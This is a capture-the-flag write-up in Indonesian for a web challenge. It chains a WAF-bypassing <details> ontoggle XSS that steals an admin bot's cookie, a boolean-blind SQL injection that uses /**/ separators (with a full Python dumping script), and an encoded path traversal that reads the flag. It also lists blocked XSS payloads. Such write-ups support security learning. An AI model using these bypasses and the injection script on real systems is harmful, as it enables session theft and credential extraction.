# `BMN` — web

> 🏷️ **Challenge metadata**

|                  |                    |                |                        |
| ---------------- | ------------------ | -------------- | ---------------------- |
| 🏆 **Event**     | `Gemastik 2026`    | 📅 **Date**    | `2026-08-23`           |
| 🏷️ **Category** | `web`              | 💯 **Points**  | `498`                  |
| 🧑‍💻 **Team**    | `DOSCOM Zero Day Scholars` (x0rr-dan) | 🧩 **Solver** | [`solve.py`](solve.py) |

![Modal soal BMN](img/01-soal.png)

---

### 📝 Deskripsi Soal

> **Description dari panitia:**
> - **BMN: yok dep app**
> - _dev: emangnya sudah di pentest?_
> - **BMN: gas aja yang penting botnya udah jalan**
> - _dev: awas akunmu_
> - **provider account like kind of developer** (keknya keluar pas wave 2)

**Connection info:**

```text
http://15.232.64.175:13410
```

---

### ⚔️ Exploitation Step

Login ke dashboard dulu, buat explore dashboardnya.

![Dashboard user](img/02-dashboard.png)

Disini mata saya langsung fokus ke fitur transfer sama dokumen, sempet ngehabisin banyak waktu buat
explore fitur transfer yang kirain kita bakal IDOR buat dapetin apa gitu dan ternyata engga, jadi
langsung fokus ke fitur dokumen.

![Daftar dokumen](img/03-dokumen-list.png)

Dan baru sadar kalo ada kolom status yang bakal berubah secara otomatis, nunggu beberapa detik gitu
dia bakal langsung `approved`. Berarti ada mekanisme buat auto approve gitu dari sistem, atau user
lain (ada bot admin yang ninjau).

![Dokumen pending](img/04-dokumen-pending.png)
![Dokumen otomatis jadi reviewed](img/05-dokumen-reviewed.png)

Sempet mikir kalo SSRF tapi kok keknya ga mungkin ya di fitur kek ginian, jadi langsung kepikiran
apa XSS kali ya. Nyoba basic payload XSS kena 403, makin yakin kalo ini emang harus XSS buat dapetin
cookie dari user lain.

![Basic payload XSS kena 403](img/06-waf-xss.png)

Payload yang kena blok:

```javascript
<script>alert(1)</script>
javascript:
<img src=>
oneerror=
onload=
onfocus=
onclick=
<svg onload=>
<body onload>
document.cookie
```

Setelah mikir buat pake tag yang bisa bypass WAF dari hasil fuzzing payload, saya kepikiran buat
pake tag `details`.

![Referensi tag details](img/07-details-ref.png)

Dengan hasil akhir seperti ini (payload ditaruh sebagai isi dokumen, pas bot ninjau `ontoggle`
jalan dan cookie dikirim ke webhook):

![Payload details ontoggle di preview dokumen](img/08-xss-payload.png)

Disini kita bisa dapet `admin_token=`:

![admin_token ketangkep di webhook.site](img/09-webhook-token.png)

```
"admin_token=c18ab6435dd4141b246779795e7e9bd9"
```

Terus langsung aja tambahin value baru di storage browser.

![Set admin_token di storage browser](img/10-storage-cookie.png)

Disini sempet bingung karna tampilan dashboard ga berubah apa apa, gaada menu baru atau semacamnya.

![Dashboard tetap sama](img/11-account.png)

Terus kepikiran buat akses path `/admin` dan ternyata bisa.

![Panel Admin BMN di /admin](img/12-admin-panel.png)

Disini cuma ada input field buat reset username user. Sini saya fuzzing aja pake username ngawur
dan valid, tambahin `'`, username user yang valid, sama username ngawur buat ngeliat perbedaan
responnya.

Hasil fuzzing nunjukin kalo user yang ngawur itu responsennya:

```
POST /admin/reset
username=kuda

Response
{"message":"Pengguna tidak ditemukan.","status":"notfound"}
```

Hasil fuzzing nunjukin kalo user yang valid itu responsennya:

```
POST /admin/reset
username=lemper

Response
{"message":"Tautan reset kata sandi telah dikirim ke nasabah.","status":"ok"}
```

Hasil fuzzing nunjukin kalo user yang valid atau pun ngawur dengan `'` itu responsennya:

```
POST /admin/reset
username=lemper' / username=AAAAAAAAAAAAAAAAa'

Response
{"message":"Permintaan tidak dapat diproses.","status":"error"}
```

Disini saya pake sqlmap buat validasi apakah vuln sama SQL injection apa ga.

![sqlmap boolean-based blind (SQLite)](img/13-sqlmap.png)

Ternyata vuln tapi emang perlu bypass WAF-nya. Karna saya malas umek-umek pake sqlmap dan udah coba
akalin via tamper script ga bisa, jadi mending manual aja.

![OR 1=1 kena WAF 403](img/14-waf-block.png)

Setelah nyoba ngakalin kita bisa bypass pake `/**/` sebagai separator.

![Bypass WAF pakai /**/](img/15-waf-bypass.png)

Karna emang dia boolean based blind, kita harus bruteforce dari length sampe isi dari data yang mau
kita ambil. Karna dari soal itu bilang user provider itu kek user developer, jadi saya kepikiran
dump password dari user provider. Tapi disini saya sempet bingung apakah usernya itu tetep provider
apa beda.

![Cek user provider valid](img/16-provider-user.png)

Dari fitur reset pass kita tau kalo username untuk user provider itu ya tetep `provider` hehe, jadi
langsung aja disini saya buat script buat dump password provider berdasarkan username. Solver
lengkap di [`solve.py`](solve.py):

```python
import requests, time, sys

COOKIE = {"admin_token": "c18ab6435dd4141b246779795e7e9bd9"}
URL = "http://15.232.64.175:13410/admin/reset"
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"}

# patokan ril or fek
# {"status":"ok"}        -> TRUE response dari web
# {"status":"notfound"}  -> FALSE ni kalo usernamenya gaada
TRUE_MARKER = '"status":"ok"'
FALSE_MARKER = '"status":"notfound"'

def check_char(position, char_code):
    payload = f"nonexist'/**/OR/**/(unicode/**/(substr/**/(password,{position},1))={char_code}/**/AND/**/\"role\"='provider')/**/AND/**/'1'='1"
    r = requests.post(URL, headers=HEADERS, cookies=COOKIE, data={"username": payload})
    return TRUE_MARKER in r.text

def main():
    print("[*] Dumping password provider...")
    found = ""
    not_found_count = 0
    max_not_found = 3  # 3x ga nemu berarti kelar
    for pos in range(1,100):
        found_char = None
        for code in range(32, 127):
            if check_char(pos, code):
                found_char = chr(code)
                found += found_char
                print(f"[+] FOUND '{found_char}' {pos:2d} | [{found}]")
                not_found_count = 0
                break

        if found_char is None:
            not_found_count += 1
            print(f"[-] Pos {pos}: not_found_count={not_found_count}")

        if not_found_count >= max_not_found:
            print(f"[-] {max_not_found}x not found. Stoping.")
            break

    print(f"\n[+] PASSWORD PROVIDER: {found}")

if __name__ == "__main__":
    main()
```

![Dump password provider](img/17-dump-password.png)

```
username: provider
password: pr0v1d3r_k3y_2n26
```

Login pakai kredensial `provider` tadi, masuk ke Portal Provider.

![Portal Provider](img/18-portal-provider.png)

Habis buka captcha di vault baru kita bisa ke statement buat get `welcome.txt`, yang setelah diliat
dari requestnya fix path traversal.

![Endpoint statement rawan path traversal](img/19-path-traversal.png)

Pake payload `..%2f..%2f..%2fflag` karna `../../../flag` kena WAF, jadi coba encode aja.

```
GET /provider/statement?file=..%2f..%2f..%2fflag
```

---

### 🚩 Flag

```
GEMASTIK19{bmn_x55b0t_bl1ndsqli_p4thtr4v_w4fbyp455_cha1n3d}
```

---

### 🔗 Referensi

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [HTML `details` tag](https://www.w3schools.com/tags/tag_details.asp)
- chat ai
